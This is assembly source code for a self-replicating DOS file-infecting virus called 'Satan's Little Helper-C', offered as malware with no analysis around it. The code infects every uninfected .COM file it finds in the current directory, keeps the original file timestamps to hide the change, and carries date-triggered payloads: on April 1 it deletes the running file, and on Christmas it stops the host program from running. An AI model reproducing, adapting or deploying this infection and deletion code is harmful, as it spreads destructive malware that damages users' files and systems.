;			Virus
;		Satan's Little Helper-C
;This version:
;Searches current directory for non-infected com files, if any found
;it will become infected!
;This virus has a routine which self-destructs itself and uninfects
;the file.
	assume cs:code
	.286
code	segment	"code"
	org 0100h
start	proc
	jmp	v_start		;first 5 bytes |
	nop			;              |
	nop			;              |
v_start:
	call $+3		;Actual virus
	pop dx
	sub dx, 3
	push dx			;save relocation factor in BP
	pop bp			;so virus can be copied anywhere twoards
	mov si, dx		;the end of the file
				;
;			Replace first 5 bytes in memory with original
;			program code so normal program can run later
	add si, first_five
	mov di, 0100h
	mov cx, 5
	lodsb
	stosb
	loop $-2
;see if user want to disinfect this file
	mov si, 82h
	lodsb
	cmp al, "["		;is al the code to disinfect?  "["
	jne ok_dont_disinfect
	jmp self_kill 
ok_dont_disinfect:
				;here should be date checks to see
				;if an evil function should be unleashed!!
	mov ah, 2ah
	int 21h
	;cx year 1980-2099
	;dh month 1-12
	;dl day
	;al day of week  0=sun 1=mon -> 7=sat
	cmp dh, 12
	jne notdec
	cmp dl, 25
	jne notdec
	jmp christmas
notdec:
	cmp dh, 4
	jne notapril
	cmp dl, 1
	jne notapril
	jmp aprilfools	
notapril:

;Set the DTA
	call set_dta
				;find first file to  ?infect?
	call find_first_file
go_again:
	mov si, bp
	add si, size_
	lodsw
	cmp ax, 5
	ja gd4
	jmp resrch	
gd4:
	call open_file
	mov bx, ax
	mov al, 0
	call date_time
	mov ah, 3fh
	mov cx, 5
	mov dx, bp
	add dx, first_five
	int 21h
	mov ax, 4202h
	mov cx, 0
	mov dx, cx
	int 21h
	sub ax, 3
	mov si, bp
	add si, new_5
	mov [si+1], ax
	mov si, bp
	mov di, si
	add si, chkmark
	add di, mark
	mov cx, 2
	repe cmpsb
	jne INFECT
;File found was previously infected!
; search for new one now.
	jmp resrch

wipe_name:
	push di
	push ax
	push cx
	mov di, bp
	add di, name_
	mov cx, 13
	mov al, 0
	rep stosb
	pop cx
	pop ax
	pop di
	ret
resrch:
	call wipe_name
	mov ah, 4fh
	int 21h
	jnc gd3
	jmp term_virus
gd3:
	jmp go_again
INFECT:
;Time to infect the file!!
	mov si, bp
	add si, handle
	mov bx, [si]
	mov cx, vsize
	mov dx, bp
	call wipe_name
	mov ax, 4000h
	int 21h
	mov ax, 4200h
	mov cx, 0
	mov dx, cx
	int 21h
	mov dx, bp
	add dx, new_5
	mov ax, 4000h
	mov cx, 5
	int 21h
	mov al, 1
	call date_time
	mov ax, 3e00h
	int 21h
	jmp resrch 

fndnam	proc
	mov si, env
	mov ax, [si]
	mov es, ax
	mov ds, ax
	mov si, 0
	mov di, si
__lp:
	lodsb
	cmp al, 0
	je chknxt
	stosb
	jmp __lp
chknxt:
	stosb
	lodsb
	cmp al, 0
	je fnd1
	stosb
	jmp __lp
fnd1:
	stosb
__lp2:
	lodsb
	cmp al, "a"
	jae ff_
up2:
	cmp al, "A"
	jae fff_
up3:
	stosb
	jmp __lp2
ff_:
	cmp al,"z"
	jbe fnd
	jmp up2
fff_:
	cmp al, "Z"
	jbe fnd
	jmp up3
fnd:
	mov si, di
	mov al, 0
	repne scasb
	mov dx, si
	mov di, dx
	ret
env	equ 2ch
fndnam 	endp


self_kill:
		;this procedure disinfects specified files
		;SI points to the name of current file on disk
		;which is infected
	call fndnam	;find name of current file from env block in memory
	jmp gd__	
abrt:
	int 20h
gd__:
	mov ax, 3d02h
	int 21h
	jc abrt
	mov bx, ax
	mov ax, cs
	mov ds, ax
	mov es, ax
	mov cx, 5
	mov dx, bp
	add dx, first_five
	call wipe_name
	mov ax, 4000h
	int 21h
	jc abrt
	mov dx, 0
	mov cx, 0
	mov ax, 4202h
	int 21h
	jnc gd__1
	jmp abrt
gd__1:
	sub ax, vsize
	mov dx, ax
	mov cx, 0
	mov ax, 4200h
	int 21h
	call wipe_name
	mov cx, 0
	mov ax, 4000h
	int 21h
	mov ax, 3e00h
	int 21h
	jmp term_virus
date_time:
	pusha
	mov ah, 57h
	cmp al, 0
	je fnd__$
	mov di, bp
	mov si, di
	add di, date
	add si, time
	mov dx, [di]
	mov cx, [si]
	int 21h
	jmp ret__
fnd__$:
	int 21h
	mov si, bp
	mov di, bp
	add si, time
	add di, date
	mov [si], cx
	mov [di], dx
ret__:
	popa
	ret
open_file:
	mov dx, bp
	add dx, name_
	mov ax, 3d02h
	int 21h
	jnc gd2
	jmp term_virus
gd2:
	mov si, bp
	add si, handle
	mov [si], ax
	ret
find_first_file:
	mov dx, bp
	mov cx, 0
	mov ah, 4eh
	add dx, all_com_files
	int 21h
	jnc gd1
	jmp term_virus
gd1: 
	ret
set_dta:
	mov dx, bp
	mov ah, 1ah
	add dx, dta
	int 21h
	ret
term_virus:
	mov ax, 0
	mov bx, ax
	mov cx, bx
	mov dx, cx
	mov si, 0100h
	mov di, -1
	mov bp, di
	push 0100h
	ret

CHRISTMAS:
;Program Lockup
; Exit without running program   
	int 20h
APRILFOOLS:
;Ha Ha delete current file
	call fndnam
	mov ah, 41h
	int 21h
	mov ax, cs
	mov ds, ax
	mov es, ax
	jmp term_virus
;			Data	Bank
_fstfive:
	int 20h
	nop
ckmrk:
	nop
	nop
acf	db "*.COM",0
dt_	dw 0
tme	dw 0
d_t_a:
	rfd	db 21 dup (0)
	att	db 0
		dw 0
		dw 0
	sz	dd 0
	n_me	db 13 dup (0),0
handl	dw 0
nw_5	db 0e9h,0,0
mrk	db "66"
strain	db "C"
;
end___:
first_five	= offset _fstfive-0105h
all_com_files	= offset acf-0105h
dta		= offset d_t_a-0105h
attribute	= offset att-0105h
time		= offset tme-0105h
date		= offset dt_-0105h
size_		= offset sz-0105h
name_		= offset n_me-0105h
handle		= offset handl-0105h
new_5		= offset nw_5-0105h
mark		= offset mrk-0105h
chkmark		= offset ckmrk-0105h
vsize		= offset end___-0105h
start	endp
code	ends
	end	start
	